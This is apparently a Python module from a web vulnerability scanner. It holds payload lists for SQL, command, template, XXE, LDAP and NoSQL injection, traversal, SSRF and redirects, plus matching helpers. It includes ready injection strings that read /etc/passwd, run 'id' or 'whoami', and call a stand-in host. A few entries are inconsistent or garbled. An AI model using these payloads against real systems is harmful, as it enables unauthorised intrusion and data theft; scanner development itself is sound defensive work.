"""The payloads a professional scan uses and how the answers are judged.

Every injection check works the same way: it takes the endpoint as it is, sends
it again unchanged and keeps that answer as the baseline. Then it sends the
endpoint with one parameter replaced by a payload and compares the two answers.

What counts as a finding differs per class of bug, so each check brings its own
:func:`detect`. The helpers in this module hold the payloads and the small
pieces of shared logic.
"""

from __future__ import annotations

import re
from dataclasses import dataclass

__all__ = [
    "COMMAND_PAYLOADS",
    "LDAP_PAYLOADS",
    "NOSQL_PAYLOADS",
    "OPEN_REDIRECT_PAYLOADS",
    "PROTOTYPE_PAYLOADS",
    "REFLECTION_MARKERS",
    "SQLI_BOOLEAN_PAYLOADS",
    "SQLI_ERROR_PAYLOADS",
    "SQLI_ERROR_SIGNATURES",
    "SQLI_TIME_PAYLOADS",
    "SSTI_PAYLOADS",
    "SSRF_PAYLOADS",
    "TRAVERSAL_PAYLOADS",
    "XXE_PAYLOADS",
    "XSS_PAYLOADS",
    "DeserializationProbe",
    "difference",
    "looks_like_error",
    "reflected",
]


# --------------------------------------------------------------------- SQL

#: Payloads that break out of a string and cause a database error.
SQLI_ERROR_PAYLOADS: tuple[str, ...] = (
    "'",
    "''",
    '"',
    "')",
    "'))",
    "') OR '1'='1",
    "1' ORDER BY 99--",
    "1; SELECT 1--",
    "1' UNION SELECT NULL--",
    "1' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x "
    "FROM information_schema.tables GROUP BY x)a)--",
    "1' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version())))--",
    "1' WAITFOR DELAY '0:0:5'--",
    "1;WAITFOR DELAY '0:0:5'--",
    "1' AND SLEEP(5)--",
    "1' AND pg_sleep(5)--",
    "1' AND benchmark(10000000,MD5(1))--",
    "1' INTO OUTFILE '/tmp/probe.txt'--",
    "COPY (SELECT '') TO PROGRAM 'id'--",
)

#: Payloads that change the answer when the query is injected.
SQLI_BOOLEAN_PAYLOADS: tuple[tuple[str, str], ...] = (
    ("' AND '1'='1", "' AND '1'='2"),
    ("' AND 1=1--", "' AND 1=2--"),
    ("1 AND 1=1", "1 AND 1=2"),
    ("') AND ('1'='1", "') AND ('1'='2"),
    ("' OR '1'='1", "' OR '1'='2"),
)

#: Payloads that make the database wait.
SQLI_TIME_PAYLOADS: tuple[str, ...] = (
    ("' OR SLEEP(5)--", "Sleep"),
    ("' WAITFOR DELAY '0:0:5'--", "Waitfor"),
    ("1; SELECT pg_sleep(5)--", "pg_sleep"),
    ("1' AND (SELECT SLEEP(5))--", "Sleep"),
)

#: What a database error looks like in an answer.
SQLI_ERROR_SIGNATURES: tuple[str, ...] = (
    "you have an error in your sql syntax",
    "warning: mysql",
    "warning: mysqli",
    "warning: pg_query",
    "unclosed quotation mark",
    "quoted string not properly terminated",
    "sqlstate[",
    "ora-00933",
    "ora-01756",
    "ora-00942",
    "microsoft ole db provider for sql server",
    "syntax error at or near",
    "pgerror",
    "sqlite3::queryexception",
    "sqlite/jdbcdriver",
    "mysql_fetch_array",
    "mysql_num_rows",
    "mysqli_sql_exception",
    "com.mysql.jdbc.exceptions",
    "postgresql query failed",
    "sqlite/jdbcdriver",
    "supplied argument is not a valid",
    "odbc drivers error",
    "jet database engine",
    "unexpected token",
    "database error",
    "sql syntax",
    "postgresql",
    "mariadb",
    "sqlite",
)


# --------------------------------------------------------------------- XSS

#: Payloads that show up in the answer when the input is reflected.
XSS_PAYLOADS: tuple[str, ...] = (
    "<script>alert(1)</script>",
    "'\"><script>alert(1)</script>",
    '"><img src=x onerror=alert(1)>',
    "<img src=x onerror=alert(1)>",
    "<svg/onload=alert(1)>",
    "<body onload=alert(1)>",
    "javascript:alert(1)",
    "'-alert(1)-'",
    "{{7*7}}",
    "${7*7}",
    "<iframe src=javascript:alert(1)>",
    "<object data=javascript:alert(1)>",
    "<a href=javascript:alert(1)>click</a>",
    "onmouseover=alert(1)",
    "';alert(1);//",
)

#: What a reflected payload proves when it comes back unchanged.
REFLECTION_MARKERS: tuple[str, ...] = (
    "alert(1)",
    "<script>",
    "onerror=",
    "onload=",
    "onmouseover=",
    "javascript:",
)


# ----------------------------------------------------------------- command

#: Payloads that run a command when the input reaches a shell.
COMMAND_PAYLOADS: tuple[str, ...] = (
    ";id",
    "|id",
    "&&id",
    "`id`",
    "$(id)",
    ";whoami",
    "|whoami",
    "&&whoami",
    "`whoami`",
    "$(whoami)",
    ";cat /etc/passwd",
    "|cat /etc/passwd",
    "&&cat /etc/passwd",
    ";uname -a",
    "|uname -a",
    "&&uname -a",
    ";sleep 5",
    "|sleep 5",
    "&&sleep 5",
    ";nslookup intercept.example",
    "|nslookup intercept.example",
    "&&ping -c 1 127.0.0.1",
    ";echo 1",
    "|echo 1",
)

#: What the output of a command looks like.
COMMAND_OUTPUT_MARKERS: tuple[str, ...] = (
    "uid=",
    "gid=",
    "root:x:0:0",
    "www-data",
    "linux",
    "macos",
    "windows",
    "/bin/bash",
    "/bin/sh",
    "command not found",
)


# -------------------------------------------------------------------- SSTI

#: Payloads that make a template engine evaluate an expression.
SSTI_PAYLOADS: tuple[str, ...] = (
    "{{7*7}}",
    "{{7*'7'}}",
    "${{7*7}}",
    "#{7*7}",
    "<%= 7*7 %>",
    "{{config}}",
    "{{self}}",
    "${{<%[%'\"}}%>",
    "{{''.__class__}}",
    "${T(java.lang.Runtime).getRuntime()}",
    "{{cycler.__init__.__globals__.os}}",
)


# --------------------------------------------------------------------- XXE

#: Payloads that make an XML parser reach out.
XXE_PAYLOADS: tuple[str, ...] = (
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://127.0.0.1:1/xxe">]><foo>&xxe;</foo>',
    '<?xml version="1.0"?><!DOCTYPE lolz [<!ENTITY lol "lol">'
    '<!ENTITY lol2 "&lol;&lol;&lol;">]><lolz>&lol2;</lolz>',
    '<?xml version="1.0"?><!DOCTYPE data [<!ENTITY file SYSTEM '
    '"php://filter/convert.base64-encode/resource=index.php">]><data>&file;</data>',
)


# -------------------------------------------------------------------- SSRF

#: Payloads that make the server fetch a URL.
SSRF_PAYLOADS: tuple[str, ...] = (
    "http://127.0.0.1/",
    "http://127.0.0.1:80/",
    "http://localhost/",
    "http://[::1]/",
    "http://0.0.0.0/",
    "http://0177.0.0.1/",
    "http://2130706433/",
    "http://127.1/",
    "file:///etc/passwd",
    "gopher://127.0.0.1:11211/",
    "dict://127.0.0.1:11211/",
)


# -------------------------------------------------------------------- LDAP

#: Payloads that break out of an LDAP filter.
LDAP_PAYLOADS: tuple[str, ...] = (
    "*",
    "admin*",
    "*)(|(password=*",
    "*)(uid=*))(|(uid=*",
    ")(cn=*))(|(cn=*",
    "*))%00",
    "admin)(|(password=*",
    "*)(&",
    "*)(objectClass=*",
)


# ------------------------------------------------------------------- NoSQL

#: Payloads that change a MongoDB query.
NOSQL_PAYLOADS: tuple[str, ...] = (
    '{"$ne": "invalid"}',
    '{"$gt": ""}',
    '{"$exists": true}',
    '{"$regex": ".*"}',
    '{"$where": "1==1"}',
    "true",
    "$ne",
    "['$ne']",
)


# ---------------------------------------------------------------- traversal

#: Payloads that read a file outside of the web root.
TRAVERSAL_PAYLOADS: tuple[str, ...] = (
    "../../../../../../etc/passwd",
    "..%2f..%2f..%2f..%2fetc%2fpasswd",
    "....//....//....//....//etc/passwd",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "..%252f..%252f..%252fetc%252fpasswd",
    "..\\..\\..\\..\\windows\\win.ini",
    "/etc/passwd",
    "php://filter/convert.base64-encode/resource=index.php",
    "file:///etc/passwd",
    "....//....//....//....//....//etc/passwd",
)

#: What a read of a system file looks like.
TRAVERSAL_MARKERS: tuple[str, ...] = (
    "root:x:0:0",
    "[extensions]",
    "<?php",
    "<?xml",
    "for 16-bit app support",
)


# ----------------------------------------------------------------- redirect

#: Payloads that make the server send a redirect to another host.
OPEN_REDIRECT_PAYLOADS: tuple[str, ...] = (
    "https://intercept.example/",
    "//intercept.example/",
    "https:\\\\intercept.example/",
    "/\\interc###pt.example/",
    "https://intercept.example/%23",
    "https://intercep%74.example/",
)


# ------------------------------------------------------- prototype pollution

#: Payloads that try to reach the prototype of an object.
PROTOTYPE_PAYLOADS: tuple[str, ...] = (
    "__proto__[polluted]=yes",
    "__proto__.polluted=yes",
    "constructor.prototype.polluted=yes",
    "__proto__[constructor][prototype][polluted]=yes",
)


# ------------------------------------------------------------ deserialization

#: Payloads that try to make a deserializer build an object.
DESERIALIZATION_PAYLOADS: tuple[str, ...] = (
    "rO0ABXNyABdqYXZhLnV0aWwuUHJpb3JpdHlRdWV1ZQ==",
    'O:8:"stdClass":1:{s:4:"polluted";b:1;}',
    '["java.lang.Runtime","getRuntime"]',
    '["O:8:"stdClass":0:{}"]',
    '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]><r>&x;</r>',
    "rO0ABXNyABNjb20uamF2YS5uYW1lLmdyb3VwLmdyb3Vw",
)


@dataclass(slots=True)
class DeserializationProbe:
    """One deserialization attempt."""

    name: str
    payload: str
    marker: str = ""


# ------------------------------------------------------------------ helpers


def difference(baseline: str, probe: str) -> int:
    """How much longer the answer got."""
    return len(probe) - len(baseline)


def looks_like_error(text: str, signatures: tuple[str, ...]) -> str:
    """The first signature that shows up in the answer, if any.

    The text is returned as the server wrote it, so the evidence reads like
    the answer and not like a list of keywords.
    """
    lowered = text.lower()
    for signature in signatures:
        index = lowered.find(signature)
        if index >= 0:
            return text[index : index + len(signature)]
    return ""


def reflected(text: str, payload: str) -> str:
    """The part of the payload that came back, if it did."""
    if payload and payload in text:
        return payload
    for marker in REFLECTION_MARKERS:
        if marker in text:
            return marker
    return ""


def strip_tags(text: str) -> str:
    """The text without any markup."""
    return re.sub(r"<[^>]+>", " ", text)


def stable_fingerprint(text: str, size: int = 200) -> str:
    """A short, comparable form of an answer."""
    return re.sub(r"\s+", " ", strip_tags(text)).strip()[:size]
